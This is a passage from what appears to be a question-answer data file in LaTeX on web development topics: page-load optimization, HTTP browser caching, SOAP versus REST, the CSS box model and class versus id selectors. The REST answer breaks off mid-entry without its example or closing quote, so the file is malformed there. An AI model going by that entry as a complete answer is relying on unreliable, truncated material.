\\texttt{Expires}, and \\texttt{ETag}. This allows browsers to store static assets locally, preventing re-downloading on subsequent visits.\n    \\item \\textbf{Content Delivery Networks (CDNs)}: Distribute static assets (images, CSS, JavaScript) across a global network of servers. Users are served content from the server geographically closest to them, significantly reducing latency and server load.\n    \\item \\textbf{Minimize HTTP Requests (HTTP/1.x considerations)}: While less critical with modern protocols like HTTP/2+, for HTTP/1.x, combining CSS and JavaScript files into fewer bundles or using CSS sprites (combining multiple small images into one larger image) can reduce the number of round trips.\n    \\item \\textbf{Adopt HTTP/2 or HTTP/3}:\n    \\begin{itemize}\n        \\item \\textbf{HTTP/2}: Enables \\textbf{multiplexing} (multiple requests/responses over a single TCP connection), \\textbf{header compression} (\\texttt{HPACK}), and \\textbf{server push} (sending resources before they are explicitly requested by the client).\n        \\item \\textbf{HTTP/3}: Builds upon HTTP/2 by using the \\texttt{QUIC} protocol, which runs over UDP. It offers improved connection establishment (0-RTT for resumed connections), better handling of packet loss, and further reduces head-of-line blocking by enabling stream-level multiplexing.\n    \\end{itemize}\n    \\item \\textbf{DNS Prefetching and Preconnection}: Use \\texttt{<link rel=\"dns-prefetch\" href=\"//example.com\">} to resolve DNS for third-party domains (e.g., analytics, ad networks) in advance. Use \\texttt{<link rel=\"preconnect\" href=\"//example.com\">} to establish an early connection (DNS lookup, TCP handshake, TLS negotiation) to critical third-party origins, saving crucial milliseconds.\n\\end{itemize}\n\n\\subsection*{III. Critical Rendering Path Optimization}\nFocus on delivering the essential content and styles to the user as quickly as possible, allowing the browser to render the initial view.\n\n\\begin{itemize}\n    \\item \\textbf{Prioritize Critical CSS}: Extract and inline the minimal CSS required for the \"above-the-fold\" content (the part of the page visible without scrolling) directly into the HTML. This prevents external, render-blocking CSS files from delaying the initial paint. Non-critical CSS can then be loaded asynchronously.\n    \\item \\textbf{Defer Non-Critical JavaScript}: Load non-essential JavaScript files using \\texttt{async} or \\texttt{defer} attributes or dynamic loading techniques.\n    \\begin{lstlisting}[language=HTML, caption=Using \\texttt{async} and \\texttt{defer} for JavaScript]\n<script src=\"analytics.js\" async></script>\n<script src=\"third-party-widget.js\" defer></script>\n    \\end{lstlisting}\n    \\begin{itemize}\n        \\item \\texttt{async}: Downloads the script asynchronously in parallel with HTML parsing and executes it as soon as it's downloaded, without blocking HTML parsing. Execution order relative to other scripts is not guaranteed.\n        \\item \\texttt{defer}: Downloads the script asynchronously in parallel with HTML parsing but executes it only after the HTML document has been completely parsed, just before the \\texttt{DOMContentLoaded} event. Execution order is guaranteed relative to other deferred scripts.\n    \\end{itemize}\n    \\item \\textbf{Reduce DOM Size and Complexity}: A smaller, flatter DOM tree requires less time for the browser to parse, style, and render. Avoid deeply nested structures and unnecessary elements (e.g., excessive \\texttt{div}s).\n\\end{itemize}\n\n\\subsection*{IV. Server-Side and Backend Optimizations}\nImproving the server's response time before content is even sent to the client.\n\n\\begin{itemize}\n    \\item \\textbf{Optimize Backend Code and Database Queries}: Ensure the server-side application code is efficient, database queries are optimized (e.g., proper indexing, minimizing N+1 queries, caching query results), and API endpoints respond quickly. Use profiling tools to identify bottlenecks.\n    \\item \\textbf{Server-Side Caching}: Cache dynamically generated content (e.g., HTML fragments, API responses, database results) at various levels (opcode cache, object cache, page cache) at the server to reduce the need for repeated computation.\n    \\textbf{Keep-Alive Headers}: Configure the server to use \\texttt{Connection: keep-alive} HTTP headers. This allows the client and server to maintain a persistent connection, reducing the overhead of establishing new TCP connections for successive requests from the same client.\n    \\item \\textbf{Pre-rendering/Server-Side Rendering (SSR) / Static Site Generation (SSG)}: For content-heavy sites or those reliant on search engine optimization, generating HTML on the server (SSR) or at build time (SSG) (rather than relying entirely on client-side JavaScript to build the DOM) can significantly improve perceived load time, First Contentful Paint (FCP), and Core Web Vitals, especially for users on slower networks or devices.\n\\end{itemize}\n\nBy implementing a combination of these strategies, developers can significantly reduce the loading time of HTTP pages, leading to a better user experience, improved search engine rankings, and higher conversion rates.",

    "question": "How browser caching works in the front-end?",
    "answer": "\\section*{Introduction to Browser Caching}\nBrowser caching is a fundamental technique used in front-end development to significantly improve website performance and user experience. When a browser visits a web page, it downloads various resources like HTML files, CSS stylesheets, JavaScript files, images, and fonts. Caching allows the browser to store copies of these resources locally, so that on subsequent visits to the same page or other pages using the same resources, it doesn't have to re-download them from the server. This reduces page load times, saves bandwidth for both the user and the server, and decreases the load on the server.\n\n\\section*{The Fundamentals of HTTP Caching}\nBrowser caching primarily works through \\textbf{HTTP caching headers} provided by the web server in its responses. These headers instruct the browser on how to store, manage, and validate cached resources. The browser maintains a local cache (often disk-based or memory-based) where it stores these resources along with their associated caching metadata.\n\nWhen a browser requests a resource, it first checks its local cache.\n\\begin{enumerate}\n    \\item If the resource is found in the cache and is still considered \\textbf{fresh} (not expired), the browser uses the cached version without making a network request to the server. This is the fastest scenario, known as a \\textbf{cache hit}.\n    \\item If the resource is found but might be \\textbf{stale} (expired), the browser sends a \\textbf{conditional request} to the server to check if the resource has been modified.\n    \\item If the resource is not found in the cache, or if the server indicates it has changed, the browser downloads the new version and caches it for future use.\n\\end{enumerate}\n\nHTTP caching mechanisms can be broadly categorized into two types: \\textbf{strong caching} (expiration-based) and \\textbf{weak caching} (validation-based).\n\n\\section*{Strong Caching (Expiration-Based)}\nStrong caching allows the browser to use a cached resource without contacting the server at all, as long as the resource is within its specified expiration period. This is the most performant type of caching.\n\n\\subsection*{\\texttt{Cache-Control} Header}\nThe \\texttt{Cache-Control} header is the most powerful and flexible HTTP caching header. It allows web developers to define various directives that control who can cache the resource, for how long, and under what conditions.\n\nKey \\texttt{Cache-Control} directives:\n\\begin{itemize}\n    \\item \\texttt{max-age=<seconds>}: This is the most common directive. It specifies the maximum amount of time (in seconds) that a resource is considered fresh. For example, \\texttt{Cache-Control: max-age=3600} means the resource can be cached for one hour.\n    \\item \\texttt{no-cache}: Despite its name, \\texttt{no-cache} does \\textit{not} mean \"do not cache.\" It means \"cache the resource, but always revalidate it with the server before using it.\" The browser must send a conditional request to the origin server to check if the cached version is still valid.\n    \\item \\texttt{no-store}: This directive truly means \"do not cache this resource at all.\" The browser must not store any part of the request or response in any cache. Useful for highly sensitive or rapidly changing content.\n    \\item \\texttt{public}: Indicates that the resource can be cached by any cache, including shared proxy caches.\n    \\item \\texttt{private}: Indicates that the resource is intended for a single user and can only be cached by private caches (e.g., the user's browser cache), not by shared caches.\n    \\item \\texttt{must-revalidate}: When present, if a cached resource becomes stale, the browser \\textit{must} revalidate it with the origin server before using it. It cannot be served stale.\n\\end{itemize}\n\\begin{lstlisting}[language=HTTP, caption=Example Cache-Control Header]\nHTTP/1.1 200 OK\nContent-Type: text/css\nCache-Control: public, max-age=31536000\n\\end{lstlisting}\nThis example tells the browser to cache the CSS file publicly for one year (31,536,000 seconds) without revalidation during that period.\n\n\\subsection*{\\texttt{Expires} Header}\nThe \\texttt{Expires} header is an older, HTTP/1.0 header that specifies an absolute date and time after which the response is considered stale. It's largely superseded by \\texttt{Cache-Control}'s \\texttt{max-age} because \\texttt{Expires} relies on the server's and client's clocks being synchronized, which can lead to issues. If both \\texttt{Expires} and \\texttt{Cache-Control} are present, \\texttt{Cache-Control} generally takes precedence.\n\\begin{lstlisting}[language=HTTP, caption=Example Expires Header]\nHTTP/1.1 200 OK\nContent-Type: image/jpeg\nExpires: Tue, 01 Jan 2030 12:00:00 GMT\n\\end{lstlisting}\n\n\\section*{Weak Caching (Validation-Based)}\nWeak caching involves the browser contacting the server to check if a cached resource is still valid. If the server indicates no changes, it responds with a lightweight \\texttt{304 Not Modified} status, telling the browser to use its cached version. This saves bandwidth by avoiding re-downloading the entire resource body.\n\n\\subsection*{\\texttt{ETag} (Entity Tag)}\nThe \\texttt{ETag} header provides an opaque identifier (a string, often a hash or timestamp combined with other data) that represents a specific version of a resource. When the server sends a resource, it includes an \\texttt{ETag}. The browser stores this tag along with the cached resource.\n\nOn subsequent requests for the same resource, if the cached version is stale (e.g., \\texttt{max-age} has passed or \\texttt{no-cache} is set), the browser sends an \\texttt{If-None-Match} request header containing the stored \\texttt{ETag}. The server then compares this \\texttt{ETag} with the \\texttt{ETag} of its current version of the resource.\n\\begin{itemize}\n    \\item If the \\texttt{ETag}s match, the server responds with \\texttt{304 Not Modified} (no response body). The browser knows its cached version is still valid.\n    \\item If the \\texttt{ETag}s do not match, the server sends the new version of the resource with a \\texttt{200 OK} status and its new \\texttt{ETag}.\n\\end{itemize}\n\\begin{lstlisting}[language=HTTP, caption=ETag Workflow Example]\n# Server Response (First Request)\nHTTP/1.1 200 OK\nContent-Type: application/javascript\nETag: \"686897696a7c876a7e786b7fa\"\nCache-Control: no-cache\n\n# Browser Request (Subsequent Request)\nGET /app.js HTTP/1.1\nHost: example.com\nIf-None-Match: \"686897696a7c876a7e786b7fa\"\n\n# Server Response (Resource Not Modified)\nHTTP/1.1 304 Not Modified\n\\end{lstlisting}\n\n\\subsection*{\\texttt{Last-Modified} Header}\nThe \\texttt{Last-Modified} header provides a timestamp indicating the last time the resource was modified on the server. Similar to \\texttt{ETag}, the browser stores this timestamp with the cached resource.\n\nWhen a conditional request is made, the browser sends an \\texttt{If-Modified-Since} request header with the stored \\texttt{Last-Modified} timestamp.\n\\begin{itemize}\n    \\item If the resource has not been modified since that date, the server responds with \\texttt{304 Not Modified}.\n    \\item If the resource has been modified, the server sends the new version with a \\texttt{200 OK} status and its new \\texttt{Last-Modified} date.\n\\end{itemize}\n\\begin{lstlisting}[language=HTTP, caption=Last-Modified Workflow Example]\n# Server Response (First Request)\nHTTP/1.1 200 OK\nContent-Type: image/png\nLast-Modified: Wed, 21 Oct 2015 07:28:00 GMT\nCache-Control: no-cache\n\n# Browser Request (Subsequent Request)\nGET /logo.png HTTP/1.1\nHost: example.com\nIf-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT\n\n# Server Response (Resource Not Modified)\nHTTP/1.1 304 Not Modified\n\\end{lstlisting}\nIf both \\texttt{ETag} and \\texttt{Last-Modified} are present, \\texttt{ETag} typically takes precedence.\n\n\\section*{The Caching Process: A Workflow Example}\nLet's illustrate the typical flow for a JavaScript file:\n\n\\begin{enumerate}\n    \\item \\textbf{First Request (Cache Empty)}:\n        *   User navigates to \\texttt{example.com/index.html}.\n        *   Browser requests \\texttt{/script.js}.\n        *   Server responds with \\texttt{200 OK}, the JavaScript file content, and headers like \\texttt{Cache-Control: public, max-age=3600} and \\texttt{ETag: \"abc123def\"}.\n        *   Browser downloads and executes \\texttt{script.js}, stores it in cache along with \\texttt{max-age} and \\texttt{ETag}.\n    \\item \\textbf{Subsequent Request (Within \\texttt{max-age})}:\n        *   User revisits \\texttt{example.com} within 3600 seconds.\n        *   Browser checks cache for \\texttt{/script.js}.\n        *   It finds \\texttt{script.js} and sees that its \\texttt{max-age} has not expired.\n        *   Browser serves \\texttt{script.js} directly from cache without any network request. (HTTP Status \\texttt{200} (from cache))\n    \\item \\textbf{Subsequent Request (After \\texttt{max-age}, with \\texttt{ETag})}:\n        *   User revisits \\texttt{example.com} after 3600 seconds.\n        *   Browser checks cache for \\texttt{/script.js}.\n        *   It finds \\texttt{script.js} but sees that its \\texttt{max-age} has expired (it's stale).\n        *   Browser sends a conditional request to the server: \\texttt{GET /script.js HTTP/1.1} with \\texttt{If-None-Match: \"abc123def\"}.\n        *   \\textbf{Scenario A: Resource Unchanged}: Server compares \"abc123def\" with its current \\texttt{ETag}. They match. Server responds with \\texttt{304 Not Modified}. Browser uses its cached \\texttt{script.js} and updates its freshness lifetime.\n        *   \\textbf{Scenario B: Resource Changed}: Server compares \"abc123def\" with its current \\texttt{ETag}. They do not match (e.g., current \\texttt{ETag} is \"xyz456uvw\"). Server responds with \\texttt{200 OK}, the new \\texttt{script.js} content, and a new \\texttt{ETag: \"xyz456uvw\"}. Browser downloads, executes, and updates its cached version.\n\\end{enumerate}\n\n\\section*{Service Workers: Advanced Caching}\n\\textbf{Service Workers} offer a powerful, programmatic way to control caching beyond traditional HTTP headers. A Service Worker is a JavaScript file that runs in the background, separate from the main browser thread. It acts as a programmable proxy between the browser and the network.\n\nKey features for caching:\n\\begin{itemize}\n    \\item \\textbf{Intercept Requests}: Service Workers can intercept all network requests made by the page they control.\n    \\item \\textbf{Cache API}: They have access to the \\texttt{Cache API}, which is a persistent storage mechanism for network requests and responses. Developers can explicitly cache resources and define custom caching strategies (e.g., \"cache first, then network,\" \"network first, then cache,\" \"stale-while-revalidate\").\n    \\item \\textbf{Offline Capabilities}: Service Workers are crucial for building Progressive Web Apps (PWAs) that work reliably offline, as they can serve content directly from the cache even when there's no network connection.\n\\end{itemize}\n\\begin{lstlisting}[language=javascript, caption=Basic Service Worker Cache-First Strategy]\n// service-worker.js\nself.addEventListener('fetch', (event) => {\n  event.respondWith(\n    caches.match(event.request) // Try to find the request in the cache\n      .then((response) => {\n        // If found, return the cached response\n        if (response) {\n          return response;\n        }\n        // If not found, fetch from the network\n        return fetch(event.request);\n      })\n  );\n});\n\\end{lstlisting}\n\n\\section*{Other Client-Side Storage Mechanisms}\nWhile related to storing data on the client, these are distinct from HTTP caching, which primarily deals with network resources:\n\\begin{itemize}\n    \\item \\textbf{\\texttt{localStorage}}: Provides a way to store key-value pairs persistently across browser sessions (no expiration). Suitable for user preferences or small amounts of application data.\n    \\item \\textbf{\\texttt{sessionStorage}}: Similar to \\texttt{localStorage} but data is cleared when the browser tab/window is closed.\n    \\item \\textbf{IndexedDB}: A low-level API for client-side storage of significant amounts of structured data, including files/blobs. It's an asynchronous API designed for web applications that need to store large amounts of data offline.\n\\end{itemize}\n\n\\section*{Cache Invalidation Strategies}\nA critical aspect of caching is ensuring users receive fresh content when updates are deployed. Common strategies include:\n\\begin{itemize}\n    \\item \\textbf{Cache Busting (Versioning/Fingerprinting)}: The most reliable method for assets like CSS, JavaScript, and images. When a file's content changes, its filename is also changed (e.g., \\texttt{app.123abc.js} becomes \\texttt{app.456xyz.js}). Since the browser has never seen the new filename, it treats it as a completely new resource and fetches it. Old versions can be cached indefinitely with long \\texttt{max-age} values.\n    \\item \\textbf{Controlled \\texttt{Cache-Control} Directives}:\n        *   For critical HTML files, using \\texttt{Cache-Control: no-cache} or \\texttt{Cache-Control: max-age=0, must-revalidate} ensures the browser always revalidates the HTML with the server, even if it has a cached copy. This allows the server to serve updated HTML which then references the new cache-busted asset URLs.\n        *   Setting shorter \\texttt{max-age} for frequently updated content.\n    \\item \\textbf{Service Worker Updates}: When a Service Worker file itself changes, the browser detects the change, installs the new worker, and activates it. Developers can use this lifecycle to clear old caches and ensure new resources are fetched.\n\\end{itemize}",

    "question": "Difference between \\texttt{SOAP} and \\texttt{REST} protocols.",
    "answer": "\\section*{\\texttt{SOAP} vs. \\texttt{REST} Protocols}\n\nBoth \\texttt{SOAP} (Simple Object Access Protocol) and \\texttt{REST} (Representational State Transfer) are popular approaches for building web services that allow different applications to communicate over a network. While they serve similar goals, their underlying philosophies, architectures, and practical implementations differ significantly.\n\n\\subsection*{\\texttt{SOAP}}\n\\texttt{SOAP} is a \\textbf{protocol} for exchanging structured information in the implementation of web services. It relies heavily on \\texttt{XML} for its message format and operates over a variety of standard application protocols, most commonly \\texttt{HTTP}, but also \\texttt{SMTP}, \\texttt{JMS}, and others.\n\n\\subsubsection*{Key Characteristics of \\texttt{SOAP}:}\n\\begin{itemize}\n    \\item \\textbf{Protocol-Based}: \\texttt{SOAP} is a standardized protocol defined by the W3C. It has strict rules regarding message structure, data types, and communication patterns.\n    \\item \\textbf{\\texttt{XML}-Based}: All \\texttt{SOAP} messages are encoded using \\texttt{XML}. This makes messages self-describing but also verbose and heavier.\n    \\item \\textbf{Strict Specifications}: \\texttt{SOAP} relies on a set of related standards, often referred to as \\texttt{WS-\\* (Web Services)} specifications, which include:\n    \\begin{itemize}\n        \\item \\texttt{WSDL} (Web Services Description Language): An \\texttt{XML}-based language for describing the functionality offered by a \\texttt{SOAP} web service, including its operations, input/output parameters, and data types.\n        \\item \\texttt{WS-Security}: A specification that defines how to implement integrity and confidentiality in \\texttt{SOAP} messages.\n        \\item \\texttt{WS-ReliableMessaging}, \\texttt{WS-AtomicTransaction}, etc.: Provide features like reliable message delivery and transaction management.\n    \\end{itemize}\n    \\item \\textbf{Transport Agnostic}: While often used over \\texttt{HTTP}, \\texttt{SOAP} can be used with virtually any transport protocol. This flexibility is a key differentiator.\n    \\item \\textbf{Stateful or Stateless}: \\texttt{SOAP} can support both stateful and stateless operations, though stateless operations are generally preferred for scalability.\n    \\item \\textbf{Heavier Overhead}: Due to its reliance on \\texttt{XML} and extensive headers, \\texttt{SOAP} messages typically have a larger payload size and higher processing overhead compared to \\texttt{REST}.\n    \\item \\textbf{Strong Tooling Support}: Many enterprise-grade development environments provide robust tools for generating \\texttt{SOAP} clients and servers from \\texttt{WSDL} definitions, simplifying development for complex systems.\n\\end{itemize}\n\n\\subsubsection*{Example \\texttt{SOAP} Request:}\nA typical \\texttt{SOAP} request involves an \\texttt{Envelope}, \\texttt{Header} (optional), and \\texttt{Body}.\n\n\\begin{lstlisting}[language=XML, caption=\\texttt{SOAP} Request Example]\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n                  xmlns:myservice=\"http://www.example.com/MyService\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <myservice:GetProductDetails>\n         <myservice:productId>12345</myservice:productId>\n      </myservice:GetProductDetails>\n   </soapenv:Body>\n</soapenv:Envelope>\n\\end{lstlisting}\n\n\\subsection*{\\texttt{REST}}\n\\texttt{REST} (Representational State Transfer) is an \\textbf{architectural style} for designing networked applications. It's not a protocol in itself but rather a set of constraints that, when applied, yield a distributed system with desirable properties like performance, scalability, and simplicity. \\texttt{REST} is almost exclusively used over \\texttt{HTTP}.\n\n\\subsubsection*{Key Characteristics of \\texttt{REST}:}\n\\begin{itemize}\n    \\item \\textbf{Architectural Style}: \\texttt{REST} defines a set of principles and constraints for how web services communicate, focusing on resources and their representations.\n    \\item \\textbf{Resource-Oriented}: Everything in a \\texttt{REST}ful system is treated as a resource, identifiable by a unique \\texttt{URI} (Uniform Resource Identifier). Clients interact with these resources using standard \\texttt{HTTP} methods.\n    \\item \\textbf{Stateless}: Each request from a client to a server must contain all the information needed to understand the request. The server should not store any client context between requests. This improves scalability and reliability.\n    \\item \\textbf{Standard \\texttt{HTTP} Methods}: \\texttt{REST} leverages standard \\texttt{HTTP} verbs to perform operations on resources:\n    \\begin{itemize}\n        \\item \\texttt{GET}: Retrieve a resource.\n        \\item \\texttt{POST}: Create a new resource or submit data.\n        \\item \\texttt{PUT}: Update an existing resource (full replacement).\n        \\item \\texttt{PATCH}: Partially update an existing resource.\n        \\item \\texttt{DELETE}: Remove a resource.\n    \\end{itemize}\n    \\item \\textbf{Lightweight and Flexible Data Formats}: \\texttt{REST} services can use various data formats for representations, most commonly \\texttt{JSON} (JavaScript Object Notation), but also \\texttt{XML}, plain text, or others. \\texttt{JSON} is often preferred for its brevity and ease of parsing in web applications.\n    \\item \\textbf{Cacheable}: Responses should be explicitly or implicitly defined as cacheable or non-cacheable to improve network efficiency.\n    \\item \\textbf{Layered System}: A client typically cannot tell whether it is connected directly to the end server or to an intermediary along the way.\n    \\item \\textbf{Simplicity and Ease of Use}: Generally easier to implement and consume compared to \\texttt{SOAP} due to its reliance on standard \\texttt{HTTP} and simpler message formats.\n\\end{itemize}\n\n\\subsubsection*{Example \\texttt{REST} Request:}\nA typical \\texttt{REST} request targets a \\texttt{URI} and uses an \\texttt{HTTP} method.

    "question": "What are the components of a \\texttt{CSS} box model?",
    "answer": "The \\textbf{CSS Box Model} is a fundamental concept in web design that describes how HTML elements are rendered on a webpage. Every HTML element is considered a rectangular box, and this model defines how the dimensions, spacing, and borders of these boxes are calculated and interact with other elements. Understanding the box model is crucial for controlling layout and visual presentation.\n\nThe box model consists of four distinct components, from the innermost to the outermost:\n\n\\textbf{Content}\nThis is the innermost part of the box, where the actual content of the element resides. This includes text, images, or other media. The size of the content area is typically controlled by the \\texttt{width} and \\texttt{height} CSS properties. For example, if you set \\texttt{width: 200px;}, this generally refers to the width of the content area.\n\n\\textbf{Padding}\nThe \\textbf{padding} is the transparent space that surrounds the content area and separates it from the border. It acts as internal spacing within the element. Padding takes on the background color of the element. You can control padding on all four sides (top, right, bottom, left) using properties like \\texttt{padding}, \\texttt{padding-top}, \\texttt{padding-right}, \\texttt{padding-bottom}, and \\texttt{padding-left}. Increasing padding makes the element visually larger by adding space inside its border.\n\n\\textbf{Border}\nThe \\textbf{border} is a line that immediately surrounds the padding (and thus the content). It defines the visual edge of the element's box. Borders have properties such as \\texttt{border-width}, \\texttt{border-style}, and \\texttt{border-color}, which can be set for individual sides or all sides simultaneously (e.g., \\texttt{border: 1px solid black;}).\n\n\\textbf{Margin}\nThe \\textbf{margin} is the outermost layer of the box model. It is a transparent space that surrounds the border and creates separation between the element and other adjacent elements on the page. Unlike padding, margin does not take on the element's background color. Margins collapse vertically between block-level elements, meaning the larger of two adjacent vertical margins will be used, not their sum. Properties include \\texttt{margin}, \\texttt{margin-top}, \\texttt{margin-right}, \\texttt{margin-bottom}, and \\texttt{margin-left}.\n\n\\vspace{0.5em} % Small vertical space for readability\n\n\\textbf{Box-Sizing Property:}\n\nAn important aspect related to the box model is the \\texttt{box-sizing} CSS property, which alters how the \\texttt{width} and \\texttt{height} of an element are calculated.\n\n\\begin{itemize}\n    \\item \\texttt{\\textbf{content-box}} (default): This is the standard W3C box model. When \\texttt{width} and \\texttt{height} are set, they apply only to the \\textbf{content} area. Padding and border are added \\textit{on top of} these dimensions. So, a \\texttt{width} of \\texttt{200px} with \\texttt{10px} padding and \\texttt{1px} border will result in an element that is \\texttt{200 + 2*10 + 2*1 = 222px} wide.\n    \\item \\texttt{\\textbf{border-box}}: This alternative model is widely preferred by developers for its intuitive behavior. When \\texttt{width} and \\texttt{height} are set, they define the dimensions of the element including its \\textbf{padding} and \\textbf{border}. The content area shrinks to accommodate the padding and border within the specified \\texttt{width} and \\texttt{height}. So, a \\texttt{width} of \\texttt{200px} with \\texttt{10px} padding and \\texttt{1px} border will result in an element that is exactly \\texttt{200px} wide, with the content area being \\texttt{200 - 2*10 - 2*1 = 178px} wide.\n\\end{itemize}\n\n\\textbf{Example:}\nConsider the following CSS and HTML:\n\n\\begin{lstlisting}[language=html, basicstyle=\\ttfamily\\small, columns=fullflexible]\n<!DOCTYPE html>\n<html>\n<head>\n<style>\n  .box {\n    width: 200px;\n    height: 100px;\n    padding: 20px;\n    border: 5px solid blue;\n    margin: 10px;\n    background-color: lightgray; /* For content and padding */\n    box-sizing: content-box; /* Default model */\n  }\n\n  .box-border-box {\n    width: 200px;\n    height: 100px;\n    padding: 20px;\n    border: 5px solid red;\n    margin: 10px;\n    background-color: lightgoldenrodyellow;\n    box-sizing: border-box; /* Alternative model */\n  }\n</style>\n</head>\n<body>\n  <div class=\"box\">\n    This is a content-box element.\n  </div>\n  <div class=\"box-border-box\">\n    This is a border-box element.\n  </div>\n</body>\n</html>\n\\end{lstlisting}\n\n\\noindent In the \\texttt{box} class (using \\texttt{content-box}):\n\\begin{itemize}\n    \\item Content width: \\texttt{200px}\n    \\item Padding: \\texttt{20px} (adds \\texttt{20px} on each side, total \\texttt{40px})\n    \\item Border: \\texttt{5px} (adds \\texttt{5px} on each side, total \\texttt{10px})\n    \\item Total width of the element visible on the page (content + padding + border): \\texttt{200 + 40 + 10 = 250px}\n    \\item Margin: \\texttt{10px} (adds \\texttt{10px} of transparent space around the element)\n\\end{itemize}\n\n\\noindent In the \\texttt{box-border-box} class (using \\texttt{border-box}):\n\\begin{itemize}\n    \\item Total width of the element visible on the page (content + padding + border): \\texttt{200px}\n    \\item Border: \\texttt{5px} (consumes \\texttt{10px} of total width)\n    \\item Padding: \\texttt{20px} (consumes \\texttt{40px} of total width)\n    \\item Content width: \\texttt{200 - 10 - 40 = 150px}\n    \\item Margin: \\texttt{10px} (adds \\texttt{10px} of transparent space around the element)\n\\end{itemize}",

    "question": "What's the difference between a class selector and \\texttt{id} selector in \\texttt{CSS}?",
    "answer": "In CSS, both \\texttt{id} and \\texttt{class} selectors are used to target specific HTML elements for styling. The fundamental difference lies in their intended use, uniqueness, and specificity.\n\n\\subsection*{\\texttt{id} Selector}\nAn \\texttt{id} selector is used to target a \\textbf{single, unique} HTML element on a webpage.\n\\begin{itemize}\n    \\item \\textbf{Uniqueness}: An \\texttt{id} value \\textbf{must} be unique within the entire HTML document. While browsers might still apply styles if multiple elements share the same \\texttt{id}, this is invalid HTML, can lead to unpredictable behavior, and breaks accessibility and JavaScript expectations.\n    \\item \\textbf{Syntax}: In CSS, an \\texttt{id} is denoted by a hash symbol (\\texttt{\\#}) followed by the \\texttt{id} name (e.g., \\texttt{\\#main-header}). In HTML, it's applied using the \\texttt{id} attribute (e.g., \\texttt{id=\"main-header\"}).\n    \\item \\textbf{Specificity}: \\texttt{id} selectors have the \\textbf{highest specificity} among all basic selectors. This means styles defined with an \\texttt{id} selector will generally override styles from class, type (element), or attribute selectors if there's a conflict, unless overridden by \\texttt{!important} or inline styles.\n    \\item \\textbf{Use Cases}: Typically used for major structural or layout elements that appear only once, such as a main content area, a unique header, or a footer (\\texttt{\\#header}, \\texttt{\\#sidebar}, \\texttt{\\#footer}). They are also frequently used as targets for JavaScript to manipulate a specific DOM element directly.\n\\end{itemize}\n\n\\subsection*{\\texttt{class} Selector}\nA \\texttt{class} selector is used to target \\textbf{one or more} HTML elements.\n\\begin{itemize}\n    \\item \\textbf{Reusability}: A \\texttt{class} can be applied to multiple HTML elements throughout a document. Furthermore, a single HTML element can have multiple classes applied to it, separated by spaces (e.g., \\texttt{class=\"button primary large\"}).\n    \\item \\textbf{Syntax}: In CSS, a \\texttt{class} is denoted by a dot (\\texttt{.}) followed by the \\texttt{class} name (e.g., \\texttt{.btn-primary}). In HTML, it's applied using the \\texttt{class} attribute (e.g., \\texttt{class=\"btn-primary\"}).\n    \\item \\textbf{Specificity}: \\texttt{class} selectors have a \\textbf{lower specificity} than \\texttt{id} selectors but higher specificity than type (element) selectors.\n    \\item \\textbf{Use Cases}: Ideal for applying reusable styles to common UI components, thematic styling, or utility classes (e.g., \\texttt{.card}, \\texttt{.text-danger}, \\texttt{.hidden}). They promote modular and maintainable CSS. JavaScript can also target elements by class to manipulate groups of elements.\n\\end{itemize}\n\n\\subsection*{Key Differences Summary}\n\\begin{itemize}\n    \\item \\textbf{Uniqueness}: \\texttt{id} must be unique per document; \\texttt{class} can be used multiple times.\n    \\item \\textbf{Application}: An element can have only one \\texttt{id}; an element can have multiple \\texttt{class}es.\n    \\item \\textbf{Specificity}: \\texttt{id} has higher specificity than \\texttt{class}.\n    \\item \\textbf{Purpose}: \\texttt{id} is for unique, structural elements; \\texttt{class} is for reusable, thematic styling.\n    \\item \\textbf{Prefix}: \\texttt{\\#} for \\texttt{id}, \\texttt{.} for \\texttt{class}.\n\\end{itemize}\n\n\\subsection*{Example}\nLet's illustrate with an example:\n\n\\textbf{HTML (\\texttt{index.html})}\n\\begin{lstlisting}[language=HTML]\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Selectors Example</title>\n    <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n    <header id=\"main-header\">\n        <h1>Welcome to My Site</h1>\n    </header>\n\n    <div class=\"card\">\n        <h2>About Us</h2>\n        <p>This is some information about our company.</p>\n        <button class=\"button primary\">Learn More</button>\n    </div>\n\n    <div class=\"card warning\">\n        <h2>Important Notice</h2>\n        <p>Please read this critical update carefully.</p>\n        <button class=\"button\">Dismiss</button>\n    </div>\n\n    <footer id=\"page-footer\">\n        <p>Copyright 2023</p>\n    </footer>\n</body>\n</html>\n\\end{lstlisting}\n\n\\textbf{CSS (\\texttt{style.css})}\n\\begin{lstlisting}[language=CSS]\n/* ID Selector */\n#main-header {\n    background-color: #333;\n    color: white;\n    padding: 20px;\n    text-align: center;\n}\n\n#page-footer {\n    background-color: #eee;\n    color: #555;\n    padding: 10px;\n    text-align: center;\n    margin-top: 30px;\n}\n\n/* Class Selector */\n.card {\n    border: 1px solid #ddd;\n    border-radius: 8px;\n    padding: 15px;\n    margin: 20px;\n    box-shadow: 2px 2px 5px rgba(0,0,0,0.1);\n}\n\n.warning {\n    background-color: #fff3cd; /* Light yellow background */\n    border-color: #ffeeba;    /* Yellow border */\n    color: #856404;           /* Dark yellow text */\n}\n\n.button {\n    background-color: #f0f0f0;\n    border: none;\n    padding: 10px 15px;\n    border-radius: 5px;\n    cursor: pointer;\n    margin-top: 10px;\n}\n\n.button.primary {\n    background-color: #007bff;\n    color: white;\n}\n\\end{lstlisting}\n\nIn this example:\n\\begin{itemize}\n    \\item \\texttt{\\#main-header} and \\texttt{\\#page-footer} style unique elements using \\texttt{id} selectors.\n    \\item \\texttt{.card} applies general styling to multiple \\texttt{div} elements.\n    \\item \\texttt{.warning} modifies the style of one \\texttt{div} by adding an additional class, demonstrating multiple classes on an element.\n    \\item \\texttt{.button} styles all buttons, while \\texttt{.button.primary} provides specific styling for primary buttons, showing class chaining.\n\\end{itemize}\nThis illustrates how \\texttt{id} targets unique structural components, while \\texttt{class} offers flexibility for reusable UI patterns and variations.",

    "question": "What are the data types in \\texttt{Javascript} (primitive, non-primitive)?",
